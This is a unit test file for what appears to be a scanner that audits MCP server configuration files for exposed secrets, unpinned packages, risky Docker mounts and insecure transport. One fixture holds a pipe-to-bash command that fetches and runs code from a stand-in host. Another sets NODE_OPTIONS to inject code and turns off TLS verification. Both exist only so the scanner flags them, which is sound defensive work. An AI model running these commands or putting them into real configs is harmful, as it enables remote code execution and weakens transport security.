import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
import mcpposture as mp  # noqa: E402

EX = os.path.join(ROOT, "examples")
RISKY = os.path.join(EX, "risky_claude_desktop_config.json")
CLEAN = os.path.join(EX, "clean_mcp.json")
VSCODE = os.path.join(EX, "vscode-project", ".vscode", "mcp.json")


def audit_cfg(servers, key="mcpServers", extra=None):
    doc = {key: servers}
    if extra:
        doc.update(extra)
    d = tempfile.mkdtemp()
    p = os.path.join(d, "mcp.json")
    with open(p, "w") as fh:
        json.dump(doc, fh, indent=2)
    return mp.audit_paths([p])


def ids(rep):
    return {f.rule_id for f in rep.findings}


def run(argv):
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = mp.main(argv)
    return code, out.getvalue(), err.getvalue()


class TestJsonc(unittest.TestCase):
    def test_comments_and_trailing_commas(self):
        txt = '{\n // c\n "a": "http://x//y", /* b */ "b": [1,2,],\n}'
        self.assertEqual(json.loads(mp.strip_jsonc(txt)), {"a": "http://x//y", "b": [1, 2]})

    def test_comment_markers_inside_strings_preserved(self):
        txt = '{"a": "/* not */ // nope", "b": ",}"}'
        self.assertEqual(json.loads(mp.strip_jsonc(txt))["a"], "/* not */ // nope")

    def test_invalid_json_raises(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "mcp.json")
        with open(p, "w") as fh:
            fh.write("{ nope")
        with self.assertRaises(mp.ConfigError):
            mp.load_config(p)


class TestExtraction(unittest.TestCase):
    def test_vscode_servers_and_inputs(self):
        doc, _ = mp.load_config(VSCODE)
        servers, inputs = mp.extract_servers(doc)
        self.assertIn("perplexity", servers)
        self.assertEqual(len(inputs), 2)

    def test_vscode_settings_nested_mcp(self):
        servers, _ = mp.extract_servers({"mcp": {"servers": {"a": {"command": "x"}}}})
        self.assertIn("a", servers)


class TestSecrets(unittest.TestCase):
    def test_inline_env_token(self):
        rep = audit_cfg({"gh": {"command": "node", "args": ["s.js"], "env": {"GITHUB_TOKEN": "ghp_" + "A" * 36}}})
        self.assertIn("MP01", ids(rep))
        self.assertIn("MP12", ids(rep))

    def test_placeholders_not_flagged(self):
        for v in ["${GITHUB_TOKEN}", "${env:X}", "${input:tok}", "$TOKEN", "<your-token>", "", "xxxx", "%TOKEN%", "your_token_here"]:
            rep = audit_cfg({"s": {"command": "node", "args": ["s.js"], "env": {"API_TOKEN": v}}})
            self.assertNotIn("MP01", ids(rep), v)

    def test_masking_hides_value(self):
        secret = "sk-" + "Q" * 40
        rep = audit_cfg({"s": {"command": "node", "args": ["s.js"], "env": {"OPENAI_API_KEY": secret}}})
        for f in rep.findings:
            self.assertNotIn(secret, f.evidence)
            self.assertNotIn(secret, f.message)

    def test_non_secret_keys_ignored(self):
        rep = audit_cfg({"s": {"command": "node", "args": ["s.js"],
                               "env": {"AWS_ACCESS_KEY_ID_PATH": "/x", "TOKEN_FILE": "/run/tok", "LOG_LEVEL": "debug"}}})
        self.assertNotIn("MP01", ids(rep))

    def test_bearer_header(self):
        rep = audit_cfg({"r": {"url": "https://e.example/mcp", "headers": {"Authorization": "Bearer abcdefghijklmnop123"}}})
        self.assertIn("MP02", ids(rep))

    def test_bearer_placeholder_ok(self):
        rep = audit_cfg({"r": {"url": "https://e.example/mcp", "headers": {"Authorization": "Bearer ${input:tok}"}}})
        self.assertFalse(rep.findings)

    def test_arg_secret(self):
        rep = audit_cfg({"s": {"command": "node", "args": ["s.js", "--api-key", "abcdef123456789"]}})
        self.assertIn("MP01", ids(rep))

    def test_fine_grained_pat_no_mp12(self):
        rep = audit_cfg({"s": {"command": "node", "args": ["s.js"], "env": {"GITHUB_TOKEN": "github_pat_" + "B" * 40}}})
        self.assertIn("MP01", ids(rep))
        self.assertNotIn("MP12", ids(rep))

    def test_secret_concentration(self):
        env = {f"K{i}_TOKEN": f"${{V{i}}}" for i in range(5)}
        rep = audit_cfg({"s": {"command": "node", "args": ["s.js"], "env": env}})
        self.assertEqual(ids(rep), {"MP13"})


class TestPinning(unittest.TestCase):
    def test_npm(self):
        self.assertFalse(mp.npm_pinned("@a/b"))
        self.assertFalse(mp.npm_pinned("@a/b@latest"))
        self.assertFalse(mp.npm_pinned("pkg@^1.2.0"))
        self.assertTrue(mp.npm_pinned("@a/b@1.2.3"))
        self.assertTrue(mp.npm_pinned("pkg@2025.4.8"))
        self.assertIsNone(mp.npm_pinned("./local"))

    def test_py(self):
        self.assertFalse(mp.py_pinned("mcp-server-fetch"))
        self.assertTrue(mp.py_pinned("mcp-server-fetch==1.0.0"))
        self.assertTrue(mp.py_pinned("mcp-server-fetch@1.0.0"))
        self.assertFalse(mp.py_pinned("mcp-server-fetch@latest"))

    def test_image(self):
        self.assertFalse(mp.image_pinned("foo/bar"))
        self.assertFalse(mp.image_pinned("foo/bar:latest"))
        self.assertTrue(mp.image_pinned("foo/bar:1.2.3"))
        self.assertTrue(mp.image_pinned("foo/bar@sha256:" + "0" * 64))
        self.assertFalse(mp.image_pinned("localhost:5000/bar"))

    def test_npx_y(self):
        rep = audit_cfg({"s": {"command": "npx", "args": ["-y", "some-mcp"]}})
        self.assertTrue({"MP03", "MP04"} <= ids(rep))

    def test_uvx_from(self):
        rep = audit_cfg({"s": {"command": "uvx", "args": ["--from", "pkg==1.2.3", "pkg-cli"]}})
        self.assertNotIn("MP03", ids(rep))

    def test_pnpm_dlx(self):
        rep = audit_cfg({"s": {"command": "pnpm", "args": ["dlx", "some-mcp@latest"]}})
        self.assertIn("MP03", ids(rep))
        self.assertEqual(rep.servers[0].launcher, "pnpm dlx")


class TestDockerFsShell(unittest.TestCase):
    def test_docker_flags(self):
        rep = audit_cfg({"d": {"command": "docker", "args": ["run", "--pid=host", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img:1.0"]}})
        msgs = " ".join(f.message for f in rep.findings)
        self.assertIn("pid", msgs)
        self.assertIn("Docker socket", msgs)
        self.assertNotIn("MP03", ids(rep))

    def test_docker_home_mount(self):
        rep = audit_cfg({"d": {"command": "docker", "args": ["run", "-v", "/Users/example:/data", "img:1.0"]}})
        self.assertIn("MP05", ids(rep))

    def test_fs_broad_roots(self):
        for root in ["/", "~", "$HOME", "/Users/example", "/home/example/", "C:\\", "/etc"]:
            rep = audit_cfg({"filesystem": {"command": "npx", "args": ["@modelcontextprotocol/server-filesystem@1.0.0", root]}})
            self.assertIn("MP06", ids(rep), root)

    def test_fs_narrow_ok(self):
        rep = audit_cfg({"filesystem": {"command": "npx", "args": ["@modelcontextprotocol/server-filesystem@1.0.0", "/home/example/proj"]}})
        self.assertNotIn("MP06", ids(rep))

    def test_shell_command(self):
        rep = audit_cfg({"x": {"command": "powershell.exe", "args": ["-File", "s.ps1"]}})
        self.assertIn("MP07", ids(rep))

    def test_pipe_to_shell(self):
        rep = audit_cfg({"x": {"command": "sh", "args": ["-c", "wget -qO- https://e.invalid/i | bash"]}})
        self.assertIn("MP11", ids(rep))

    def test_tmp_path(self):
        rep = audit_cfg({"x": {"command": "node", "args": ["/tmp/server.js"]}})
        self.assertIn("MP10", ids(rep))

    def test_env_injection_and_tls(self):
        rep = audit_cfg({"x": {"command": "node", "args": ["s.js"], "env": {"NODE_OPTIONS": "--require /x.js", "PYTHONHTTPSVERIFY": "0"}}})
        self.assertTrue({"MP14", "MP15"} <= ids(rep))


class TestRemote(unittest.TestCase):
    def test_plain_http(self):
        rep = audit_cfg({"r": {"url": "http://mcp.example.com/mcp"}})
        self.assertIn("MP08", ids(rep))

    def test_localhost_http_ok(self):
        for u in ["http://localhost:3000/sse", "http://127.0.0.1:8080/mcp", "http://[::1]:9/mcp"]:
            rep = audit_cfg({"r": {"url": u}})
            self.assertNotIn("MP08", ids(rep), u)

    def test_url_credentials(self):
        rep = audit_cfg({"r": {"serverUrl": "https://u:p4ss@e.example/mcp?token=abcdef12345"}})
        self.assertEqual([f.rule_id for f in rep.findings].count("MP09"), 2)
        self.assertEqual(rep.servers[0].transport, "http")

    def test_sse_transport(self):
        rep = audit_cfg({"r": {"url": "https://e.example/sse"}})
        self.assertEqual(rep.servers[0].transport, "sse")


class TestInputsAndDupes(unittest.TestCase):
    def test_vscode_input_password(self):
        rep = mp.audit_paths([VSCODE])
        mp16 = [f for f in rep.findings if f.rule_id == "MP16"]
        self.assertEqual(len(mp16), 1)
        self.assertIn("perplexity-key", mp16[0].message)

    def test_duplicates_across_files(self):
        rep = mp.audit_paths([EX])
        self.assertIn("MP17", ids(rep))
        self.assertIn("MP18", ids(rep))


class TestExamplesAndCli(unittest.TestCase):
    def test_risky_triggers_most_rules(self):
        rep = mp.audit_paths([RISKY])
        expected = {f"MP{i:02d}" for i in range(1, 16)}
        self.assertTrue(expected <= ids(rep), expected - ids(rep))

    def test_clean_has_no_findings(self):
        rep = mp.audit_paths([CLEAN])
        self.assertEqual(rep.findings, [])
        self.assertTrue(all(s.pinned for s in rep.servers if s.package))

    def test_dir_discovery(self):
        files, errs = mp.discover([EX])
        names = {os.path.basename(f) for f in files}
        self.assertTrue({"clean_mcp.json", "mcp.json", "risky_claude_desktop_config.json"} <= names)
        self.assertEqual(errs, [])

    def test_exit_codes(self):
        self.assertEqual(run([RISKY])[0], 1)
        self.assertEqual(run([CLEAN])[0], 0)
        self.assertEqual(run([RISKY, "--exit-zero"])[0], 0)
        self.assertEqual(run(["/nonexistent/x.json"])[0], 2)
        self.assertEqual(run([])[0], 2)
        self.assertEqual(run([RISKY, "--select", "MP99"])[0], 2)

    def test_min_severity_threshold(self):
        code, out, _ = run([VSCODE, "--min-severity", "high"])
        self.assertEqual(code, 0)
        code, _, _ = run([VSCODE, "--min-severity", "medium"])
        self.assertEqual(code, 1)

    def test_select_ignore(self):
        code, out, _ = run([RISKY, "--json", "--select", "MP08"])
        data = json.loads(out)
        self.assertEqual({f["rule_id"] for f in data["findings"]}, {"MP08"})
        code, out, _ = run([RISKY, "--json", "--ignore", "MP01,MP02"])
        self.assertFalse({"MP01", "MP02"} & {f["rule_id"] for f in json.loads(out)["findings"]})

    def test_json_shape_and_no_raw_secrets(self):
        code, out, _ = run([RISKY, "--json"])
        data = json.loads(out)
        self.assertEqual(data["overall"]["grade"], "F")
        self.assertEqual(len(data["servers"]), 8)
        self.assertNotIn("FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE0000", out)
        self.assertNotIn("hunter2", out)

    def test_sarif(self):
        code, out, _ = run([RISKY, "--sarif"])
        s = json.loads(out)
        self.assertEqual(s["version"], "2.1.0")
        res = s["runs"][0]["results"]
        self.assertTrue(res)
        rules = s["runs"][0]["tool"]["driver"]["rules"]
        for r in res:
            self.assertEqual(rules[r["ruleIndex"]]["id"], r["ruleId"])
            self.assertGreaterEqual(r["locations"][0]["physicalLocation"]["region"]["startLine"], 1)

    def test_text_output_summary(self):
        code, out, _ = run([RISKY, "--no-color"])
        self.assertIn("Per-server summary", out)
        self.assertIn("Overall grade: F", out)
        self.assertNotIn("\033[", out)

    def test_list_rules(self):
        code, out, _ = run(["--list-rules"])
        self.assertEqual(code, 0)
        for rid in mp.RULES:
            self.assertIn(rid, out)

    def test_parse_error_exit_2(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "mcp.json")
        with open(p, "w") as fh:
            fh.write('{"mcpServers": {')
        self.assertEqual(run([p])[0], 2)


class TestGrades(unittest.TestCase):
    def test_grade_bands(self):
        self.assertEqual(mp.grade_for(0), "A")
        self.assertEqual(mp.grade_for(3), "B")
        self.assertEqual(mp.grade_for(20), "C")
        self.assertEqual(mp.grade_for(40), "D")
        self.assertEqual(mp.grade_for(60), "F")


if __name__ == "__main__":
    unittest.main()
